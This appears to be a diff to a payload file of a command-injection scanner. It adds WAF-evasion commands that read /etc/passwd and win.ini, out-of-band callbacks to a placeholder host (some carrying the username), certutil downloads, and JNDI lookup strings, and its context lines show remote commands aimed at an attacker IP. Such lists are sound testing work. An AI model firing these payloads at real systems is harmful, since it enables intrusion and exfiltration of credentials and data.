@@ -408,6 +408,47 @@
                 "powershell -Command \"Invoke-Command -ComputerName {attacker_ip} -ScriptBlock { whoami }\"",
                 "net use \\\\{attacker_ip}\\\\C$"
             ]
+        },
+        "waf_bypass": {
+            "unix": [
+                "cat${IFS}/etc/passwd",
+                "cat$IFS/etc/passwd",
+                "cat${IFS%??}/etc/passwd",
+                "{cat,/etc/passwd}",
+                "cat</etc/passwd",
+                "who$@ami",
+                "uname${IFS}-a",
+                "i\\d"
+            ],
+            "windows": [
+                "who^ami",
+                "wh^o^ami",
+                "type%09C:\\Windows\\win.ini",
+                "cmd /c who^ami"
+            ]
+        },
+        "oob": {
+            "unix": [
+                "curl http://{oob}/",
+                "wget -qO- http://{oob}/",
+                "nslookup {oob}",
+                "ping -c 1 {oob}",
+                "dig {oob}",
+                "curl http://{oob}/$(whoami)",
+                "curl http://$(whoami).{oob}/"
+            ],
+            "windows": [
+                "nslookup {oob}",
+                "powershell -c \"Invoke-WebRequest -UseBasicParsing http://{oob}/\"",
+                "powershell -c \"Resolve-DnsName {oob}\"",
+                "certutil -urlcache -f http://{oob}/ %TEMP%\\x",
+                "cmd /c nslookup %USERNAME%.{oob}"
+            ],
+            "java": [
+                "${jndi:ldap://{oob}/a}",
+                "${jndi:dns://{oob}/a}",
+                "${jndi:rmi://{oob}/a}"
+            ]
         }
     },
     "detection_payloads": {
@@ -416,14 +457,17 @@
             "sleep 5",
             "printf 'canary:%s' $(hostname)",
             "command -v whoami && echo HEALTH_{canary}",
-            "printf 'det:%s' $(id -u)"
+            "printf 'det:%s' $(id -u)",
+            "curl http://{oob}/",
+            "nslookup {oob}"
         ],
         "windows": [
             "echo DETECTION_{canary}",
             "timeout /T 5",
             "powershell -Command \"Start-Sleep -Seconds 3; Write-Output 'DETECTION_{canary}'\"",
             "for /f \"tokens=2 delims==\" %i in (\"%TIME%\") do @echo DETECTION_{canary}:%i",
-            "powershell -Command \"[Console]::WriteLine('det-{canary}')\""
+            "powershell -Command \"[Console]::WriteLine('det-{canary}')\"",
+            "nslookup {oob}"
         ],
         "php": [
             "echo 'DETECTION_{canary}';",
